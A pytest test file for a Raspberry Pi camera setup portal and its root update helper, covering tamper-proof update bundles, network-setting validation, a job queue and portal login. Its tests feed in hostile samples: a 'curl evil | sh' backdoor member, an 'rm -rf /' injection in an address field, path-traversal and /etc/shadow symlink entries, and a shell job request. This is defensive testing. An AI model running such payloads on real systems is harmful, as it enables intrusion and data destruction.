"""The pick PC's setup portal and update bundles: the cockpit side (perceptronics.setupportal +
its routes), the root helper (deploy/pi/perceptronics-admin) and the installer's --network.

What runs for real: the HTTP server, the queue on disk, tar files, the bash arithmetic of
install.sh, the helper's subprocesses. What can't run here: NetworkManager, nftables, systemd
— those are held to the contract by the checks at the bottom and verified on a board.
"""

from __future__ import annotations

import base64
import hashlib
import http.client
import importlib.machinery
import importlib.util
import io
import ipaddress
import json
import re
import shutil
import subprocess
import sys
import tarfile
import threading
import time
import urllib.error
import urllib.request
from http.server import ThreadingHTTPServer
from pathlib import Path

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from perceptronics import setupportal
from perceptronics.config import PerceptionConfig
from perceptronics.realsense import SyntheticRgbdCamera
from perceptronics.webapp import ViewerApp, ViewerHandler

ROOT = Path(__file__).resolve().parents[1]
PI = ROOT / "deploy" / "pi"
ADMIN = PI / "perceptronics-admin"
INSTALL = PI / "install.sh"
BUILD = PI / "image" / "build.sh"
PI_UPDATE = ROOT / "scripts" / "pi-update.sh"
WHEEL_NAME = "perceptronics-0.1.0-py3-none-any.whl"


def _load_admin():
    loader = importlib.machinery.SourceFileLoader("perceptronics_admin", str(ADMIN))
    spec = importlib.util.spec_from_loader("perceptronics_admin", loader)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["perceptronics_admin"] = mod
    loader.exec_module(mod)
    return mod


admin = _load_admin()

# The admin helper is a root service on the Pi (Linux): it opens the queue with O_NOFOLLOW,
# runs install.sh under bash and keeps POSIX paths. None of that exists on Windows, where these
# tests failed on the CI leg; the cockpit-side portal tests still run everywhere.
pi_only = pytest.mark.skipif(sys.platform == "win32", reason="the admin helper runs on the Pi (Linux)")


def _code(text: str) -> str:
    return "\n".join(ln for ln in text.splitlines() if not ln.lstrip().startswith("#"))


# ---- bundles -------------------------------------------------------------------------------


@pytest.fixture
def deploy_dir(tmp_path):
    """A deploy/pi stand-in whose install.sh records how it was called."""
    d = tmp_path / "deploy"
    d.mkdir()
    for name in admin.REQUIRED_DEPLOY:
        (d / name).write_text(f"# {name}\n", encoding="utf-8")
    (d / "install.sh").write_text(
        '#!/usr/bin/env bash\necho "install.sh $*"\necho "$*" >"${FAKE_INSTALL_ARGS:-/dev/null}"\n'
        'exit "${FAKE_INSTALL_RC:-0}"\n',
        encoding="utf-8",
    )
    (d / "install.sh").chmod(0o755)
    return d


@pytest.fixture
def wheel(tmp_path):
    w = tmp_path / WHEEL_NAME
    w.write_bytes(b"PK\x03\x04 not really a wheel" + bytes(range(256)) * 40)
    return w


@pytest.fixture
def bundle(tmp_path, wheel, deploy_dir):
    return admin.make_bundle(wheel, deploy_dir, tmp_path / "out", source_rev="abc123def456")


def _members(path: Path) -> dict[str, bytes]:
    with tarfile.open(path) as t:
        return {m.name: t.extractfile(m).read() for m in t.getmembers() if m.isfile()}


def _rewrite(path: Path, members: dict[str, bytes], extra: list[tarfile.TarInfo] | None = None) -> None:
    with tarfile.open(path, "w") as t:
        for name, data in members.items():
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            t.addfile(ti, io.BytesIO(data))
        for ti in extra or []:
            t.addfile(ti)


def _manifest_key(rel: str) -> str:
    return f"{admin.TOP}/{rel}"


@pi_only
def test_a_bundle_verifies_and_unpacks_what_it_was_built_from(bundle, wheel, deploy_dir, tmp_path):
    m = admin.verify_bundle(bundle)
    assert m["version"] == "0.1.0" and m["wheel"] == WHEEL_NAME and m["source_rev"] == "abc123def456"
    assert bundle.name == "perceptronics-update-0.1.0-abc123def456.tar"
    dest = tmp_path / "unpacked"
    admin.verify_bundle(bundle, dest=dest)
    assert (dest / WHEEL_NAME).read_bytes() == wheel.read_bytes()
    for f in deploy_dir.iterdir():
        assert (dest / "deploy" / f.name).read_bytes() == f.read_bytes()
    assert (dest / "deploy" / "install.sh").stat().st_mode & 0o111, "install.sh stays executable"
    assert sorted(p.name for p in dest.iterdir()) == ["deploy", WHEEL_NAME], "nothing unpacked beside it"


def test_the_real_deploy_directory_makes_a_bundle(tmp_path, wheel):
    out = admin.make_bundle(wheel, PI, tmp_path)
    listed = admin.verify_bundle(out)["files"]
    for name in (
        "install.sh",
        "perceptronics-admin",
        "perceptronics-admin.path",
        "perceptronics-admin.service",
    ):
        assert f"deploy/{name}" in listed


@pytest.mark.parametrize("victim", ["wheel", "deploy/install.sh", "deploy/nftables.conf"])
def test_one_changed_byte_refuses_the_bundle(bundle, victim):
    members = _members(bundle)
    key = _manifest_key(WHEEL_NAME if victim == "wheel" else victim)
    data = bytearray(members[key])
    data[len(data) // 2] ^= 0x01
    members[key] = bytes(data)
    _rewrite(bundle, members)
    with pytest.raises(admin.AdminError, match="checksum"):
        admin.verify_bundle(bundle)


@settings(max_examples=60, deadline=None, suppress_health_check=[HealthCheck.function_scoped_fixture])
@given(cut=st.floats(min_value=0.0, max_value=0.999))
def test_a_truncated_upload_is_never_accepted_with_content_missing(bundle, tmp_path, cut):
    # tar ends in zero blocks padded to a 10 KiB record: a cut inside them loses nothing
    data = bundle.read_bytes()
    with tarfile.open(bundle) as t:
        content_end = max(m.offset_data + m.size for m in t.getmembers())
    keep = int(len(data) * cut)
    short = tmp_path / "short.tar"
    short.write_bytes(data[:keep])
    try:
        got = admin.verify_bundle(short)
    except admin.AdminError:
        return  # refusing is always safe
    assert keep >= content_end, "accepted a bundle whose content was cut"
    assert got["files"] == admin.verify_bundle(bundle)["files"]


def test_an_unlisted_member_refuses_the_bundle(bundle):
    members = _members(bundle)
    members[_manifest_key("deploy/backdoor.sh")] = b"curl evil | sh\n"
    _rewrite(bundle, members)
    with pytest.raises(admin.AdminError, match="doesn't list"):
        admin.verify_bundle(bundle)


def test_a_missing_member_refuses_the_bundle(bundle):
    members = _members(bundle)
    del members[_manifest_key("deploy/nftables.conf")]
    _rewrite(bundle, members)
    with pytest.raises(admin.AdminError, match="missing"):
        admin.verify_bundle(bundle)


@pytest.mark.parametrize(
    "name",
    [
        "perceptronics-update/../../etc/cron.d/x",
        "/etc/passwd",
        "elsewhere/install.sh",
        "perceptronics-update/./deploy/x",
        "perceptronics-update//x",
    ],
)
def test_paths_outside_the_bundle_are_refused(bundle, tmp_path, name):
    members = _members(bundle)
    members[name] = b"x"
    _rewrite(bundle, members)
    dest = tmp_path / "dest"
    with pytest.raises(admin.AdminError):
        admin.verify_bundle(bundle, dest=dest)
    assert not (tmp_path / "etc").exists()


@pytest.mark.parametrize("kind", [tarfile.SYMTYPE, tarfile.LNKTYPE, tarfile.CHRTYPE, tarfile.FIFOTYPE])
def test_links_and_devices_are_refused(bundle, kind):
    ti = tarfile.TarInfo(_manifest_key("deploy/link"))
    ti.type = kind
    ti.linkname = "/etc/shadow"
    _rewrite(bundle, _members(bundle), extra=[ti])
    with pytest.raises(admin.AdminError, match="not a plain file"):
        admin.verify_bundle(bundle)


def test_a_member_listed_twice_is_refused(bundle):
    members = _members(bundle)
    key = _manifest_key("deploy/install.sh")
    ti = tarfile.TarInfo(key)
    ti.size = len(members[key])
    with tarfile.open(bundle, "a") as t:
        t.addfile(ti, io.BytesIO(members[key]))
    with pytest.raises(admin.AdminError, match="twice"):
        admin.verify_bundle(bundle)


@pytest.mark.parametrize(
    "change",
    [
        lambda m: m.update(format=2),
        lambda m: m.pop("files"),
        lambda m: m.update(wheel="evil-1.0-py3-none-any.whl"),
        lambda m: m.update(librealsense="../librealsense-2.58.4.tar"),
        lambda m: m["files"].pop("deploy/install.sh"),
    ],
)
def test_a_wrong_manifest_is_refused(bundle, change):
    members = _members(bundle)
    key = _manifest_key(admin.MANIFEST)
    manifest = json.loads(members[key])
    change(manifest)
    members[key] = json.dumps(manifest).encode()
    if "deploy/install.sh" not in manifest.get("files", {"deploy/install.sh": 1}):
        del members[_manifest_key("deploy/install.sh")]
    _rewrite(bundle, members)
    with pytest.raises(admin.AdminError):
        admin.verify_bundle(bundle)


# explicit ids: pytest puts the test id in an environment variable, and Windows refuses a NUL in one
@pytest.mark.parametrize(
    "blob",
    [b"", b"not a tar at all", b"\x1f\x8b\x08\x00gzip", b"\x00" * 10240],
    ids=["empty", "text", "truncated-gzip", "10k-nuls"],
)
def test_things_that_are_not_bundles(tmp_path, blob):
    p = tmp_path / "x.tar"
    p.write_bytes(blob)
    with pytest.raises(admin.AdminError):
        admin.verify_bundle(p)


def test_an_oversized_bundle_is_refused_before_it_is_read(bundle, monkeypatch):
    monkeypatch.setattr(admin, "MAX_BUNDLE_BYTES", bundle.stat().st_size - 1)
    with pytest.raises(admin.AdminError, match="MiB"):
        admin.verify_bundle(bundle)


def test_make_bundle_refuses_a_foreign_wheel_or_an_incomplete_deploy(tmp_path, deploy_dir, wheel):
    other = tmp_path / "requests-2.0-py3-none-any.whl"
    other.write_bytes(b"x")
    with pytest.raises(admin.AdminError):
        admin.make_bundle(other, deploy_dir, tmp_path / "o")
    (deploy_dir / "nftables.conf").unlink()
    with pytest.raises(admin.AdminError, match="nftables.conf"):
        admin.make_bundle(wheel, deploy_dir, tmp_path / "o")


# ---- applying an update (install.sh is a stand-in that records its call) --------------------


@pytest.fixture
def helper_paths(tmp_path, monkeypatch):
    state = tmp_path / "state"
    monkeypatch.setattr(admin, "STATE", state)
    monkeypatch.setattr(admin, "STATUS", state / "status.json")
    monkeypatch.setattr(admin, "WORK", state / "work")
    (state / "work").mkdir(parents=True)
    monkeypatch.setattr(admin, "LIBREALSENSE_PARENT", tmp_path / "opt")
    releases = iter(["0.1.0-old", "0.2.0-new", "0.1.0-old"])
    current = {"v": next(releases)}
    monkeypatch.setattr(admin, "_current_release", lambda: current["v"])
    return state, current, releases


def _job(admin_mod, state):
    return admin_mod.Job("20261003T120000-00000000", "update", state / "status.json")


@pi_only
def test_an_update_runs_the_bundles_installer_with_its_wheel(bundle, helper_paths, tmp_path, monkeypatch):
    state, current, releases = helper_paths
    args = tmp_path / "args"
    monkeypatch.setenv("FAKE_INSTALL_ARGS", str(args))

    def healthy(*a, **k):
        current["v"] = "0.2.0-new"
        return True

    monkeypatch.setattr(admin, "wait_healthy", healthy)
    job = _job(admin, state)
    admin.apply_update(bundle, job)
    assert job.data["state"] == "done", job.data
    called = args.read_text().split()
    assert called[0] == "--wheel" and called[1].endswith(WHEEL_NAME)
    assert not any(admin.WORK.iterdir()), "the unpacked bundle is removed"
    status = json.loads((state / "status.json").read_text())
    assert status["job"]["state"] == "done"


@pi_only
def test_a_failing_installer_leaves_the_release_alone(bundle, helper_paths, monkeypatch):
    state, *_ = helper_paths
    monkeypatch.setenv("FAKE_INSTALL_RC", "3")
    monkeypatch.setattr(
        admin, "wait_healthy", lambda *a, **k: pytest.fail("no health check after a failed install")
    )
    job = _job(admin, state)
    with pytest.raises(admin.AdminError, match="exit 3"):
        admin.apply_update(bundle, job)


@pi_only
def test_a_release_that_does_not_come_up_is_rolled_back(bundle, helper_paths, tmp_path, monkeypatch):
    state, *_ = helper_paths
    rollback_args = tmp_path / "rollback-args"
    fake_installed = tmp_path / "installed-install.sh"
    fake_installed.write_text(f'#!/usr/bin/env bash\necho "$*" >{rollback_args}\n', encoding="utf-8")
    monkeypatch.setattr(admin, "INSTALL_SH", fake_installed)
    calls = []
    monkeypatch.setattr(admin, "wait_healthy", lambda *a, **k: calls.append(1) or len(calls) > 1)
    job = _job(admin, state)
    admin.apply_update(bundle, job)
    assert job.data["state"] == "rolled_back", job.data
    assert rollback_args.read_text().split() == ["--rollback"]


@pi_only
def test_the_prebuilt_librealsense_is_unpacked_only_when_it_differs(
    tmp_path, wheel, deploy_dir, helper_paths, monkeypatch
):
    state, *_ = helper_paths
    src = tmp_path / "lrs-src" / "librealsense-2.58.4"
    (src / "lib").mkdir(parents=True)
    (src / ".perceptronics-build-stamp").write_text("v2.58.4 abc\n")
    (src / "lib" / "librealsense2.so.2.58.4").write_bytes(b"\x7fELF")
    (src / "lib" / "librealsense2.so").symlink_to("librealsense2.so.2.58.4")
    lrs = tmp_path / "librealsense-2.58.4.tar"
    with tarfile.open(lrs, "w") as t:
        t.add(src, arcname="librealsense-2.58.4")
    b = admin.make_bundle(wheel, deploy_dir, tmp_path / "out", librealsense=lrs)
    monkeypatch.setattr(admin, "wait_healthy", lambda *a, **k: True)
    admin.apply_update(b, _job(admin, state))
    opt = tmp_path / "opt" / "librealsense-2.58.4"
    assert (opt / "lib" / "librealsense2.so").is_symlink()
    assert (opt / ".perceptronics-build-stamp").read_text() == "v2.58.4 abc\n"
    marker = opt / "lib" / "untouched"
    marker.write_text("x")
    admin.apply_update(b, _job(admin, state))
    assert marker.exists(), "the same build stamp is not unpacked again"


# ---- network requests: the cockpit's copy and the helper's copy are the same rules ----------

GOOD = {
    "cidr": "10.20.0.50/24",
    "gateway": "10.20.0.1",
    "dns": ["10.20.0.1"],
    "robot_host": "10.20.0.10",
    "robot_dhcp": False,
}


@pytest.mark.parametrize(
    "change, match",
    [
        ({"cidr": "10.20.0.0/24"}, "network's own"),
        ({"cidr": "10.20.0.255/24"}, "broadcast"),
        ({"cidr": "10.20.0.50/31"}, "subnet mask"),
        ({"cidr": "10.20.0.50/7"}, "subnet mask"),
        ({"cidr": "127.0.0.5/8", "gateway": "", "robot_host": "127.0.0.9"}, "can't be"),
        ({"cidr": "169.254.1.2/16", "gateway": "", "robot_host": "169.254.1.3"}, "can't be"),
        ({"cidr": "224.0.0.5/24", "gateway": "", "robot_host": "224.0.0.6"}, "can't be"),
        ({"cidr": "10.20.0.50"}, "prefix"),
        ({"cidr": "10.20.0.050/24"}, "address"),
        ({"cidr": "10.20.0.50/24; rm -rf /"}, "prefix"),
        ({"gateway": "10.21.0.1"}, "not on"),
        ({"gateway": "10.20.0.50"}, "own address"),
        ({"robot_host": "10.20.0.50"}, "own address"),
        ({"robot_host": "10.20.0.10\n"}, "robot address"),
        ({"robot_host": ""}, "robot address"),
        ({"robot_host": None}, "robot address"),
        ({"dns": ["1.1.1.1", "8.8.8.8", "9.9.9.9", "1.0.0.1"]}, "three"),
        ({"dns": "1.1.1.1"}, "three"),
        ({"dns": ["1.1.1.1 --foo"]}, "DNS"),
        ({"robot_dhcp": "yes"}, "true or false"),
        ({"robot_dhcp": True, "robot_host": "10.21.0.10"}, "on 10.20.0.0/24"),
        ({"admin": True}, "unknown"),
    ],
)
def test_bad_network_requests_are_refused_by_both(change, match):
    req = {**GOOD, **change}
    with pytest.raises(setupportal.PortalError, match=match):
        setupportal.validate_network(req)
    with pytest.raises(admin.AdminError, match=match):
        admin.validate_network(req)


def test_a_good_request_is_normalised_the_same_by_both():
    assert setupportal.validate_network(GOOD) == admin.validate_network(GOOD) == GOOD
    routed = {**GOOD, "robot_host": "10.30.0.10"}  # a robot on another subnet, through the gateway
    assert setupportal.validate_network(routed) == admin.validate_network(routed)


_octet = st.integers(0, 255).map(str)
_addr = st.builds(lambda *o: ".".join(o), _octet, _octet, _octet, _octet)
_maybe_addr = st.one_of(_addr, st.just(""), st.text(max_size=20), st.none(), st.integers())
_request = st.fixed_dictionaries(
    {
        "cidr": st.one_of(
            st.builds(lambda a, p: f"{a}/{p}", _addr, st.integers(0, 33)), st.text(max_size=25)
        ),
        "gateway": _maybe_addr,
        "dns": st.one_of(st.lists(_addr, max_size=4), _maybe_addr),
        "robot_host": _maybe_addr,
        "robot_dhcp": st.one_of(st.booleans(), st.none(), st.just("true")),
    }
)


@settings(max_examples=400, deadline=None)
@given(req=_request)
def test_the_cockpit_and_the_helper_agree_on_every_request(req):
    def outcome(fn, err):
        try:
            return ("ok", fn(dict(req)))
        except err:
            return ("refused", None)

    assert outcome(setupportal.validate_network, setupportal.PortalError) == outcome(
        admin.validate_network, admin.AdminError
    )


@settings(max_examples=200, deadline=None)
@given(req=_request)
def test_what_reaches_the_installer_is_only_validated_addresses(req):
    try:
        argv = admin.network_argv(req, Path("/opt/perceptronics/deploy/install.sh"))
    except admin.AdminError:
        return
    assert argv[:3] == ["bash", "/opt/perceptronics/deploy/install.sh", "--network"]
    values = dict(zip(argv[3::2], argv[4::2], strict=True))
    assert set(values) == {"--cell-address", "--robot-host", "--gateway", "--dns", "--cell-dhcp"}
    for v in values.values():
        assert re.fullmatch(r"[0-9./,]+|none|auto|off", v), v


@pytest.mark.parametrize(
    "form, cidr",
    [
        ({"address": "10.1.2.3", "netmask": "255.255.255.0"}, "10.1.2.3/24"),
        ({"address": "10.1.2.3", "netmask": "/16"}, "10.1.2.3/16"),
        ({"address": " 10.1.2.3 ", "netmask": "22"}, "10.1.2.3/22"),
        ({"address": "10.1.2.3", "netmask": "255.255.252.0"}, "10.1.2.3/22"),
    ],
)
def test_the_form_takes_a_mask_the_way_people_write_it(form, cidr):
    req = setupportal.network_from_form({**form, "robot_host": "10.1.2.9", "dns": "10.1.2.1;  10.1.2.2"})
    assert req["cidr"] == cidr
    assert req["dns"] == ["10.1.2.1", "10.1.2.2"]


@pytest.mark.parametrize("mask", ["255.0.255.0", "255.255.255.1", "abc", "", "123", "0x18"])
def test_the_form_refuses_what_is_not_a_mask(mask):
    with pytest.raises(setupportal.PortalError, match="mask"):
        setupportal.network_from_form({"address": "10.1.2.3", "netmask": mask, "robot_host": "10.1.2.9"})


def test_the_rescue_address_stays_unless_the_new_network_holds_it():
    assert admin.keeps_rescue_address("10.20.0.50/24") and setupportal.keeps_rescue_address("10.20.0.50/24")
    assert not admin.keeps_rescue_address("192.168.3.40/24")
    assert not admin.keeps_rescue_address("192.168.0.40/16")
    assert admin.keeps_rescue_address("192.168.3.40/30")  # .20 is outside 192.168.3.40/30


# ---- the installer's subnet arithmetic, in bash, against ipaddress --------------------------


def _bash_functions(*names: str) -> str:
    text = INSTALL.read_text(encoding="utf-8")
    out = []
    for name in names:
        m = re.search(rf"^{name}\(\) \{{\n.*?^\}}\n", text, re.S | re.M)
        assert m, name
        out.append(m.group(0))
    return "\n".join(out)


BASH = shutil.which("bash")


@pytest.mark.skipif(BASH is None or sys.platform == "win32", reason="needs bash")
@settings(max_examples=150, deadline=None)
@given(
    a=st.ip_addresses(v=4).map(str),
    b=st.ip_addresses(v=4).map(str),
    prefix=st.integers(8, 30),
)
def test_install_sh_subnet_math_matches_ipaddress(a, b, prefix):
    script = _bash_functions("ip_to_int", "in_network", "network_of") + (
        f'\nnetwork_of "{a}/{prefix}"\nif in_network "{b}" "{a}/{prefix}"; then echo in; else echo out; fi\n'
    )
    ran = subprocess.run([BASH, "-c", script], capture_output=True, text=True, check=True)
    net_line, membership = ran.stdout.split()
    net = ipaddress.IPv4Interface(f"{a}/{prefix}").network
    assert net_line == str(net)
    assert membership == ("in" if ipaddress.IPv4Address(b) in net else "out")


@pytest.mark.skipif(BASH is None or sys.platform == "win32", reason="needs bash")
def test_install_sh_reads_back_the_network_settings_it_saved(tmp_path):
    env = tmp_path / "network.env"
    script = (
        f'NETWORK_ENV="{env}"\nETC_DIR="{tmp_path}"\n'
        + _bash_functions("save_network_env", "load_saved_network")
        + "\nsave_network_env eth0 10.20.0.50/24 10.20.0.1"
        + ' "10.20.0.1,1.1.1.1" off "10.20.0.0/24,192.168.3.0/24"\n'
        + "load_saved_network\n"
        + 'printf "%s|" "$saved_cell_if" "$saved_cell_address" "$saved_gateway" "$saved_dns"'
        + ' "$saved_cell_dhcp" "$saved_allow_from"\n'
    )
    ran = subprocess.run([BASH, "-c", script], capture_output=True, text=True, check=True)
    assert ran.stdout == "eth0|10.20.0.50/24|10.20.0.1|10.20.0.1,1.1.1.1|off|10.20.0.0/24,192.168.3.0/24|"


@pytest.mark.skipif(BASH is None or sys.platform == "win32", reason="needs bash")
def test_set_cell_value_changes_one_line_and_keeps_the_rest(tmp_path):
    cell = tmp_path / "cell.env"
    cell.write_text("# header\nUR_HOST=192.168.3.3\nUR_PLATFORM=eseries\nUR_HOST_EXTRA=x\n", encoding="utf-8")
    fn = _bash_functions("set_cell_value").replace('chown root:"$SVC_USER"', "true")
    script = (
        f'CELL_ENV="{cell}"\nlog() {{ :; }}\ndie() {{ exit 9; }}\n{fn}\nset_cell_value UR_HOST 10.20.0.10\n'
    )
    subprocess.run([BASH, "-c", script], check=True)
    assert cell.read_text() == "# header\nUR_HOST=10.20.0.10\nUR_PLATFORM=eseries\nUR_HOST_EXTRA=x\n"
    assert list(tmp_path.glob("cell.env.*")), "the old file is kept beside it"


# ---- the queue: the helper's side ------------------------------------------------------------


@pytest.fixture
def queue(tmp_path, helper_paths):
    q = tmp_path / "queue"
    q.mkdir()
    return q


def _status(state):
    return json.loads((state / "status.json").read_text())


@pi_only
def test_a_queued_network_request_reaches_the_installer(queue, helper_paths, monkeypatch):
    state, *_ = helper_paths
    seen = []
    monkeypatch.setattr(admin, "_run_logged", lambda job, argv: seen.append(argv) or 0)
    jid = "20261003T120000-0a0b0c0d"
    (queue / f"{jid}.json").write_text(json.dumps({"kind": "network", "network": GOOD}))
    (queue / f"{jid}.ready").touch()
    assert admin.run_queue(queue) == 1
    assert seen == [admin.network_argv(GOOD)]
    assert _status(state)["job"]["state"] == "done"
    assert not list(queue.iterdir())


@pi_only
def test_a_symlinked_request_is_refused_and_cleared(queue, helper_paths, tmp_path, monkeypatch):
    state, *_ = helper_paths
    monkeypatch.setattr(admin, "_run_logged", lambda *a: pytest.fail("ran a symlinked request"))
    secret = tmp_path / "secret.json"
    secret.write_text(json.dumps({"kind": "network", "network": GOOD}))
    jid = "20261003T120000-0a0b0c0d"
    (queue / f"{jid}.json").symlink_to(secret)
    (queue / f"{jid}.ready").touch()
    admin.run_queue(queue)
    assert _status(state)["job"]["state"] == "failed"
    assert not list(queue.iterdir()) and secret.exists()


@pi_only
def test_a_symlinked_bundle_is_not_copied(queue, helper_paths, bundle, monkeypatch):
    state, *_ = helper_paths
    monkeypatch.setattr(admin, "apply_update", lambda *a: pytest.fail("applied a symlinked bundle"))
    jid = "20261003T120000-0a0b0c0d"
    (queue / f"{jid}.json").write_text(json.dumps({"kind": "update"}))
    (queue / f"{jid}.tar").symlink_to(bundle)
    (queue / f"{jid}.ready").touch()
    admin.run_queue(queue)
    assert _status(state)["job"]["state"] == "failed"
    assert not list(admin.WORK.iterdir())


@pytest.mark.parametrize(
    "name, body",
    [
        ("../../etc/x", "{}"),
        ("20261003T120000-0a0b0c0d", '{"kind": "shell", "cmd": "id"}'),
        ("20261003T120000-0a0b0c0d", "not json"),
        (
            "20261003T120000-0a0b0c0d",
            '{"kind": "network", "network": {"cidr": "1.2.3.4/24", "robot_host": "x"}}',
        ),
    ],
)
@pi_only
def test_bad_queue_entries_never_reach_the_installer(queue, helper_paths, monkeypatch, name, body):
    monkeypatch.setattr(admin, "_run_logged", lambda *a: pytest.fail("ran a bad request"))
    safe = name if "/" not in name else "weird-name"
    (queue / f"{safe}.json").write_text(body)
    (queue / f"{safe}.ready").touch()
    admin.run_queue(queue)
    assert not list(queue.iterdir())


@pi_only
def test_an_oversized_request_is_refused(queue, helper_paths, monkeypatch):
    state, *_ = helper_paths
    monkeypatch.setattr(admin, "_run_logged", lambda *a: pytest.fail("ran an oversized request"))
    jid = "20261003T120000-0a0b0c0d"
    (queue / f"{jid}.json").write_text(json.dumps({"kind": "network", "network": GOOD, "pad": "x" * 70000}))
    (queue / f"{jid}.ready").touch()
    admin.run_queue(queue)
    assert "larger" in _status(state)["job"]["message"]


def test_status_keeps_a_short_history(tmp_path):
    path = tmp_path / "status.json"
    for i in range(admin.HISTORY + 5):
        admin.write_status({"id": f"j{i}", "state": "done"}, path)
    data = json.loads(path.read_text())
    assert data["job"]["id"] == f"j{admin.HISTORY + 4}"
    assert [j["id"] for j in data["history"]] == [f"j{i}" for i in range(admin.HISTORY + 4, 4, -1)]


# ---- the portal over HTTP --------------------------------------------------------------------


def _auth(user="admin", password="admin"):
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


@pytest.fixture
def portal_server(tmp_path):
    admin_dir = tmp_path / "admin"
    (admin_dir / "queue").mkdir(parents=True)
    status = tmp_path / "status.json"
    netenv = tmp_path / "network.env"
    portal = setupportal.Portal(
        admin_dir,
        status_file=status,
        network_env=netenv,
        image_release=tmp_path / "image-release",
        current_release=tmp_path / "current",
        robot_host="192.168.3.3",
    )
    app = ViewerApp(SyntheticRgbdCamera(width=32, height=24, fps=0), config=PerceptionConfig())
    srv = ThreadingHTTPServer(("127.0.0.1", 0), ViewerHandler)
    srv.daemon_threads = True
    srv.app = app  # type: ignore[attr-defined]
    srv.portal = portal  # type: ignore[attr-defined]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{srv.server_address[1]}", portal, srv
    srv.shutdown()
    srv.server_close()


def _req(base, path, *, method="GET", body=None, headers=None):
    req = urllib.request.Request(base + path, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


ADMIN_H = {"Authorization": _auth(), "X-Perceptronics-Admin": "1"}


def test_no_portal_on_a_cockpit_that_was_not_given_one(portal_server):
    base, _, srv = portal_server
    srv.portal = None
    assert _req(base, "/setup", headers={"Authorization": _auth()})[0] == 404
    assert _req(base, "/api/admin/status", headers={"Authorization": _auth()})[0] == 404


def test_from_env_is_off_without_the_admin_dir_and_defaults_to_admin_admin(tmp_path):
    assert setupportal.Portal.from_env({}) is None
    p = setupportal.Portal.from_env({"PERCEPTRONICS_ADMIN_DIR": str(tmp_path)})
    assert (p.user, p.password) == ("admin", "admin")
    p = setupportal.Portal.from_env(
        {
            "PERCEPTRONICS_ADMIN_DIR": str(tmp_path),
            "PERCEPTRONICS_ADMIN_USER": "op",
            "PERCEPTRONICS_ADMIN_PASSWORD": "s",
        }
    )
    assert p.authorized(_auth("op", "s")) and not p.authorized(_auth())


@pytest.mark.parametrize(
    "header",
    [
        None,
        "",
        _auth("admin", "wrong"),
        _auth("root", "admin"),
        _auth("admin", "admin "),
        "Basic !!!notbase64",
        "Basic " + base64.b64encode(b"adminadmin").decode(),
        "Bearer " + base64.b64encode(b"admin:admin").decode(),
        "Basic " + base64.b64encode(b"\xff\xfe:admin").decode(),
    ],
)
def test_the_portal_wants_its_login(portal_server, header):
    base, *_ = portal_server
    h = {} if header is None else {"Authorization": header}
    for path in ("/setup", "/api/admin/status"):
        status, headers, _ = _req(base, path, headers=h)
        assert status == 401
        assert headers.get("WWW-Authenticate", "").startswith("Basic realm=")


def test_the_page_and_status_after_login(portal_server, tmp_path):
    base, portal, _ = portal_server
    status, headers, body = _req(base, "/setup", headers={"Authorization": _auth()})
    assert status == 200 and headers["Content-Type"].startswith("text/html")
    assert b"Camera computer setup" in body
    status, _, body = _req(base, "/api/admin/status", headers={"Authorization": _auth()})
    st_ = json.loads(body)
    assert st_["network"]["cidr"] == "192.168.3.20/24" and st_["network"]["robot_host"] == "192.168.3.3"
    assert st_["busy"] is False and st_["network"]["rescue_address"] is None


def test_a_post_without_the_admin_header_is_refused(portal_server):
    base, portal, _ = portal_server
    form = {"address": "10.20.0.50", "netmask": "255.255.255.0", "robot_host": "10.20.0.10"}
    status, _, _ = _req(
        base,
        "/api/admin/network",
        method="POST",
        body=json.dumps(form).encode(),
        headers={"Authorization": _auth(), "Content-Type": "application/json"},
    )
    assert status == 403
    assert not list(portal.queue.iterdir())


def test_another_sites_page_cannot_get_the_admin_header_through_cors(portal_server):
    base, *_ = portal_server
    _, headers, _ = _req(
        base,
        "/api/admin/network",
        method="OPTIONS",
        headers={
            "Origin": "http://evil.example",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "x-perceptronics-admin",
        },
    )
    assert "Access-Control-Allow-Origin" not in headers
    assert "x-perceptronics-admin" not in headers.get("Access-Control-Allow-Headers", "").lower()


def test_a_network_change_is_queued_once(portal_server):
    base, portal, _ = portal_server
    form = {
        "address": "10.20.0.50",
        "netmask": "255.255.255.0",
        "gateway": "10.20.0.1",
        "robot_host": "10.20.0.10",
    }
    h = {**ADMIN_H, "Content-Type": "application/json"}
    status, _, body = _req(
        base, "/api/admin/network", method="POST", body=json.dumps(form).encode(), headers=h
    )
    out = json.loads(body)
    assert status == 200 and out["ok"], out
    assert out["new_url"] == "http://10.20.0.50:7621/setup" and out["rescue_address"] == "192.168.3.20"
    jid = out["job"]
    queued = json.loads((portal.queue / f"{jid}.json").read_text())
    assert queued == {"kind": "network", "network": admin.validate_network(queued["network"])}
    assert (portal.queue / f"{jid}.ready").exists()
    assert admin.JOB_ID.match(jid)
    status, _, body = _req(
        base, "/api/admin/network", method="POST", body=json.dumps(form).encode(), headers=h
    )
    assert status == 409 and "busy" in json.loads(body)["error"]
    assert len(list(portal.queue.glob("*.ready"))) == 1


def test_a_bad_form_queues_nothing(portal_server):
    base, portal, _ = portal_server
    h = {**ADMIN_H, "Content-Type": "application/json"}
    form = {"address": "10.20.0.50", "netmask": "255.255.255.0", "robot_host": "10.20.0.50"}
    status, _, body = _req(
        base, "/api/admin/network", method="POST", body=json.dumps(form).encode(), headers=h
    )
    assert status == 400 and "own address" in json.loads(body)["error"]
    assert not list(portal.queue.iterdir())


def test_a_running_job_makes_the_portal_busy(portal_server, tmp_path):
    base, portal, _ = portal_server
    admin.write_status({"id": "x", "kind": "update", "state": "running", "log": []}, portal.status_file)
    st_ = json.loads(_req(base, "/api/admin/status", headers={"Authorization": _auth()})[2])
    assert st_["busy"] and st_["job"]["state"] == "running"
    status, _, _ = _req(base, "/api/admin/update", method="POST", body=b"x" * 10, headers=ADMIN_H)
    assert status == 409


def test_an_upload_lands_in_the_queue_byte_for_byte(portal_server, bundle):
    base, portal, _ = portal_server
    data = bundle.read_bytes()
    status, _, body = _req(base, "/api/admin/update", method="POST", body=data, headers=ADMIN_H)
    out = json.loads(body)
